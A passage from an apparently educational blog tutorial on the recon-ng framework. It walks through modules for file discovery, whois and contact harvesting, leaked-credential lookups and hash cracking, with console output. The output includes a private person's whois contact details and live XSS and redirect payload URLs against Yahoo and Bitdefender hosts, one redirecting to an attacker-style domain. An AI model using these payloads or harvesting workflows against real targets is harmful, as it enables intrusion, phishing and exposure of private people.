</span><span class='line'>    recon/domains-credentials/pwnedlist/leaks_dump
</span><span class='line'>    recon/domains-domains/brute_suffix
</span><span class='line'>    recon/domains-hosts/baidu_site
</span><span class='line'>    recon/domains-hosts/bing_domain_api
</span><span class='line'>    recon/domains-hosts/bing_domain_web
</span><span class='line'>    recon/domains-hosts/brute_hosts
</span><span class='line'>    recon/domains-hosts/builtwith
</span><span class='line'>    recon/domains-hosts/google_site_api
</span><span class='line'>    recon/domains-hosts/google_site_web
</span><span class='line'>    recon/domains-hosts/netcraft
</span><span class='line'>    recon/domains-hosts/shodan_hostname
</span><span class='line'>    recon/domains-hosts/ssl_san
</span><span class='line'>    recon/domains-hosts/vpnhunter
</span><span class='line'>    recon/domains-hosts/yahoo_domain
</span><span class='line'>    recon/domains-vulnerabilities/punkspider
</span><span class='line'>    recon/domains-vulnerabilities/xssed
</span><span class='line'>    recon/domains-vulnerabilities/xssposed
</span><span class='line'>    recon/hosts-domains/migrate_hosts
</span><span class='line'>    recon/hosts-hosts/bing_ip
</span><span class='line'>    recon/hosts-hosts/freegeoip
</span><span class='line'>    recon/hosts-hosts/ip_neighbor
</span><span class='line'>    recon/hosts-hosts/ipinfodb
</span><span class='line'>    recon/hosts-hosts/resolve
</span><span class='line'>    recon/hosts-hosts/reverse_resolve
</span><span class='line'>    recon/locations-locations/geocode
</span><span class='line'>    recon/locations-locations/reverse_geocode
</span><span class='line'>    recon/locations-pushpins/flickr
</span><span class='line'>    recon/locations-pushpins/instagram
</span><span class='line'>    recon/locations-pushpins/picasa
</span><span class='line'>    recon/locations-pushpins/shodan
</span><span class='line'>    recon/locations-pushpins/twitter
</span><span class='line'>    recon/locations-pushpins/youtube
</span><span class='line'>    recon/netblocks-companies/whois_orgs
</span><span class='line'>    recon/netblocks-hosts/reverse_resolve
</span><span class='line'>    recon/netblocks-hosts/shodan_net
</span><span class='line'>    recon/netblocks-ports/census_2012
</span><span class='line'>    recon/ports-hosts/migrate_ports
</span><span class='line'>    recon/profiles-contacts/dev_diver
</span><span class='line'>    recon/profiles-contacts/linkedin
</span><span class='line'>    recon/profiles-profiles/linkedin_crawl
</span><span class='line'>    recon/profiles-profiles/namechk
</span><span class='line'>    recon/profiles-profiles/profiler
</span><span class='line'>    recon/profiles-profiles/twitter
</span><span class='line'>
</span><span class='line'>  Reporting
</span><span class='line'>  ---------
</span><span class='line'>    reporting/csv
</span><span class='line'>    reporting/html
</span><span class='line'>    reporting/json
</span><span class='line'>    reporting/list
</span><span class='line'>    reporting/pushpin
</span><span class='line'>    reporting/xlsx
</span><span class='line'>    reporting/xml</span></code></pre></td></tr></table></div></figure>


<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; show info
</span><span class='line'>
</span><span class='line'>      Name: Interesting File Finder
</span><span class='line'>      Path: modules/discovery/info_disclosure/interesting_files.py
</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Checks hosts for interesting files in predictable locations.
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  Name      Current Value  Required  Description
</span><span class='line'>  --------  -------------  --------  -----------
</span><span class='line'>  DOWNLOAD  True           yes       download discovered files
</span><span class='line'>  PORT      80             yes       request port
</span><span class='line'>  PROTOCOL  http           yes       request protocol
</span><span class='line'>  SOURCE    default        yes       source of input (see 'show info' for details)
</span><span class='line'>
</span><span class='line'>Source Options:
</span><span class='line'>  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL ORDER BY host
</span><span class='line'>  &lt;string&gt;       string representing a single input
</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
</span><span class='line'>
</span><span class='line'>Comments:
</span><span class='line'>  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,
</span><span class='line'>  server-status, jmx-console/, admin-console/, web-console/
</span><span class='line'>  * Google Dorks:
</span><span class='line'>    - inurl:robots.txt ext:txt
</span><span class='line'>    - inurl:elmah.axd ext:axd intitle:"Error log for"
</span><span class='line'>    - inurl:server-status "Apache Status"</span></code></pre></td></tr></table></div></figure>


<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; run
</span><span class='line'>[*] http://chousensha.github.io:80/robots.txt =&gt; 200. 'robots.txt' found!
</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml =&gt; 200. 'sitemap.xml' found!
</span><span class='line'>[*] http://chousensha.github.io:80/sitemap.xml.gz =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/crossdomain.xml =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/phpinfo.php =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/test.php =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/elmah.axd =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/server-status =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/jmx-console/ =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/admin-console/ =&gt; 404
</span><span class='line'>[*] http://chousensha.github.io:80/web-console/ =&gt; 404
</span><span class='line'>[*] 2 interesting files found.
</span><span class='line'>[*] ...downloaded to '/root/.recon-ng/workspaces/default/'</span></code></pre></td></tr></table></div></figure>


<p>You can see recon-ng found 2 interesting files and it downloaded them to my machine</p>

<h2>Exploitation</h2>

<ul>
<li><p>Remote Command Injection Shell Interface &ndash; Provides a shell interface for remote command injection flaws in web applications</p></li>
<li><p>Xpath Injection Brute Forcer &ndash; Exploits XPath injection flaws to enumerate the contents of serverside XML documents</p></li>
</ul>


<h2>Import</h2>

<ul>
<li><p>Advanced CSV File Importer &ndash; Imports values from a CSV file into a database table.</p></li>
<li><p>List File Importer &ndash; Imports values from a list file into a database table and column</p></li>
</ul>


<h2>Recon</h2>

<ul>
<li><p>Facebook Contact Enumerator &ndash; Harvests contacts from Facebook.com. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw &ndash; Point Usage Statistics Fetcher &ndash; Queries the Jigsaw API for the point usage statistics of the given account.</p></li>
<li><p>Jigsaw &ndash; Single Contact Retriever &ndash; Retrieves a single complete contact from the Jigsaw.com API using points from the given account</p></li>
<li><p>Jigsaw Contact Enumerator &ndash; Harvests contacts from the Jigsaw.com API. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw Authenticated Contact Enumerator &ndash; Harvests contacts from Data.com using an authenticated user account. Updates the &lsquo;contacts&rsquo; table
with the results. Use &lsquo;keys&rsquo; to set your jigsaw username and password before use.</p></li>
<li><p>LinkedIn Authenticated Contact Enumerator &ndash; Harvests contacts from the LinkedIn.com API using an authenticated connections network. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Whois Data Miner &ndash; Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the
given company search string. Updates the respective tables with the results.</p></li>
</ul>


<p>Let&rsquo;s see this in action against Yahoo:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][whois_miner] &gt; run
</span><span class='line'>[*] URL: http://whois.arin.net/rest/orgs;name=yahoo
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 701 First Avenue, Sunnyvale, CA 94089
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/nets
</span><span class='line'>[*] Netblock: 8.3.34.0/23
</span><span class='line'>[*] Netblock: 216.34.77.0/25
</span><span class='line'>[*] Netblock: 8.8.178.0/24
</span><span class='line'>[*] Netblock: 64.209.232.0/24
</span><span class='line'>[*] Netblock: 64.39.38.208/28
</span><span class='line'>[*] Netblock: 204.71.177.0/24
</span><span class='line'>[*] Netblock: 204.71.188.0/24
</span><span class='line'>[*] Netblock: 216.136.220.128/25
</span><span class='line'>[*] Netblock: 64.56.197.208/28
</span><span class='line'>[*] Netblock: 67.72.118.0/23
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/pocs
</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Admin) (Sunnyvale, CA - United States)
</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Tech) (Sunnyvale, CA - United States)
</span><span class='line'>[*] Contact: Network Abuse (abuse@yahoo-inc.com) - Whois contact (Abuse) (Sunnyvale, CA - United States)
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 325 Geri St, Lawrenceburg, TN 38464
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/nets
</span><span class='line'>[*] Netblock: 12.23.247.176/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/pocs
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Admin) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Abuse) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Tech) (Lawrenceburg, TN - United States)
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customers;name=yahoo
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/nets
</span><span class='line'>[*] Netblock: 209.132.98.0/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/nets
</span><span class='line'>[*] Netblock: 209.132.98.8/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-----
</span><span class='line'>YAHOO
</span><span class='line'>-----
</span><span class='line'>[*] Location: 624 S Grand, Los Angeles, CA 90017
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/nets
</span><span class='line'>[*] Netblock: 65.91.7.80/29
</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/pocs
</span><span class='line'>[*] No POCS found.
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 5 total (2 new) companies found.
</span><span class='line'>[*] 5 total (4 new) locations found.
</span><span class='line'>[*] 14 total (14 new) netblocks found.
</span><span class='line'>[*] 6 total (6 new) contacts found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Bing Linkedin Profile Harvester &ndash; Harvests contacts from linkedin.com by querying Bing for Linkedin pages related to the given
companies, parsing the profiles, and adding them to the &lsquo;profiles&rsquo; table</p></li>
<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various
paste sites. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>PwnedList Validator &ndash; Leverages PwnedList.com to determine if email addresses are associated with leaked credentials. Adds
compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Contacts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames associated with email addresses stored in the &lsquo;contacts&rsquo;
table.</p></li>
<li><p>FullContact Contact Enumerator &ndash; Harvests contact information and profiles from the fullcontact.com API using email addresses as
input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
table with the positive results.</p></li>
<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
positive results.</p></li>
<li><p>leakdb Hash Lookup &ndash; Uses the leakdb hash database to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with
the positive results.</p></li>
<li><p>PGP Key Owner Lookup &ndash; Searches the MIT public PGP key server for email addresses of the given domain. Updates the
&lsquo;contacts&rsquo; table with the results</p></li>
</ul>


<p>This module is similar to <a href="recon/domains-contacts/salesmaple">theHarvester</a></p>

<ul>
<li><p>SalesMaple Contact Harvester &ndash; Harvests contacts from the SalesMaple API using domains as input. Updates the &lsquo;contacts&rsquo; table with
the results.</p></li>
<li><p>Whois POC Harvester &ndash; Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; Account Credentials Fetcher &ndash; Queries the PwnedList API for credentials associated with the given usernames. Updates the
&lsquo;credentials&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; API Usage Statistics Fetcher &ndash; Queries the PwnedList API for account usage statistics</p></li>
<li><p>PwnedList &ndash; Pwned Domain Credentials Fetcher &ndash; Queries the PwnedList API to fetch all credentials for a domain. Updates the &lsquo;credentials&rsquo; table
with the results</p></li>
<li><p>PwnedList &ndash; Pwned Domain Statistics Fetcher &ndash; Queries the PwnedList API for a domain to determine if any associated credentials have been
compromised. This module does NOT return any credentials, only a total number of compromised
credentials.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leak_lookup.py) &ndash; Queries the local database for information associated with a leak ID. The &lsquo;leaks_dump&rsquo; module must
be used to populate the local database before this module will execute successfully.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leaks_dump.py) &ndash; Queries the PwnedList API for information associated with all known leaks. Updates the &lsquo;leaks&rsquo; table with the results.</p></li>
<li><p>DNS Public Suffix Brute Forcer &ndash; Brute forces TLDs and SLDs using DNS. Updates the &lsquo;domains&rsquo; table with the results</p></li>
<li><p>Baidu Hostname Enumerator &ndash; Harvests hosts from Baidu.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Bing API Hostname Enumerator &ndash; Leverages the Bing API and &ldquo;domain:&rdquo; advanced search operator to harvest hosts. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>Bing Hostname Enumerator &ndash; Harvests hosts from Bing.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>DNS Hostname Brute Forcer &ndash; Brute forces host names using DNS. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>BuiltWith Enumerator &ndash; Leverages the BuiltWith API to identify hosts, technologies, and contacts associated with a domain</p></li>
<li><p>Google CSE Hostname Enumerator &ndash; Leverages the Google Custom Search Engine API to harvest hosts using the &lsquo;site&rsquo; search operator.
Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Google Hostname Enumerator &ndash; Harvests hosts from Google.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Netcraft Hostname Enumerator &ndash; Harvests hosts from Netcraft.com. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Shodan Hostname Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;hostname&rsquo; search operator. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>SSL SAN Lookup &ndash; Uses the ssltools.com site to obtain the Subject Alternative Names for a domain. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>VPNHunter Lookup &ndash; Checks vpnhunter.com for SSL VPNs, remote accesses, email portals and generic login sites. Updates
the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Yahoo Hostname Enumerator &ndash; Harvests hosts from Yahoo.com by using the &lsquo;domain&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results.</p></li>
<li><p>PunkSPIDER Vulnerabilty Finder &ndash; Leverages the PunkSPIDER API to search for previosuly discovered vulnerabltiies on hosts within a
domain.</p></li>
<li><p>XSSed Domain Lookup &ndash; Checks XSSed.com for XSS records associated with a domain and displays the first 20 results</p></li>
</ul>


<p>This is a very handy module for XSS lookup. Let&rsquo;s take a look at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssed] &gt; run
</span><span class='line'>
</span><span class='line'>---------
</span><span class='line'>YAHOO.COM
</span><span class='line'>---------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20(docume&lt;br&gt;nt.cookie);document.location%20=%20%22http://1337hax0rz.com%22
</span><span class='line'>[*] Host: adz.kr.yahoo.com
</span><span class='line'>[*] Publish_Date: 2015-03-10 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/60821/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript&lt;br&gt;:alert(/412/)
</span><span class='line'>[*] Host: us.yimg.vip.scd.yahoo.com
</span><span class='line'>[*] Publish_Date: 2012-02-16 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/57596/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: Script Insertion
</span><span class='line'>[*] Example: http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fsc&lt;br&gt;ript%3E&sort=relevance
</span><span class='line'>[*] Host: fr.groups.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-22 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/61982/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=&lt;script&gt;alert(/XSS-by-[]0iZy5/)&lt;/scri&lt;br&gt;pt&gt;
</span><span class='line'>[*] Host: basketball.fantasysports.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/71051/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: Redirect
</span><span class='line'>[*] Example: http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO&lt;br&gt;O/EXP=1275539597/L=hnNys0Kjqbp5Cok8Sr10cAJDTPYa3UwHFG0AANhn/B=VSDoPmKJiUs-/J=1275532397077354/K=rS6p&lt;br&gt;wy3MN2NPP7SBqBCOAQ/A=6097785/R=0/SIG=11o4aqdmv/*http://xssed.com/newsearch/searchpad.html
</span><span class='line'>[*] Host: www.yahoo.com
</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
</span><span class='line'>[*] Reference: http://xssed.com/mirror/67076/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>XSSposed Domain Lookup &ndash; Checks XSSposed.com for XSS records associated with a domain</li>
</ul>


<p>Another good module for hunting down XSS</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssposed] &gt; run
</span><span class='line'>
</span><span class='line'>---------------
</span><span class='line'>BITDEFENDER.COM
</span><span class='line'>---------------
</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: https://safeweb.norton.com/report/show?url=store.bitdefender.com
</span><span class='line'>[*] Host: store.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-06-20 21:09:16
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/160213/
</span><span class='line'>[*] Status: unfixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
</span><span class='line'>[*] Host: labs.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-05-17 20:31:25
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154457/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: XSS
</span><span class='line'>[*] Example: https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
</span><span class='line'>[*] Host: rdprojects.bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-05-17 20:32:26
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154458/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
</span><span class='line'>[*] Category: REDIRECT
</span><span class='line'>[*] Example: http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/
</span><span class='line'>[*] Host: bitdefender.com
</span><span class='line'>[*] Publish_Date: 2016-01-03 01:53:37
</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/121291/
</span><span class='line'>[*] Status: fixed
</span><span class='line'>--------------------------------------------------
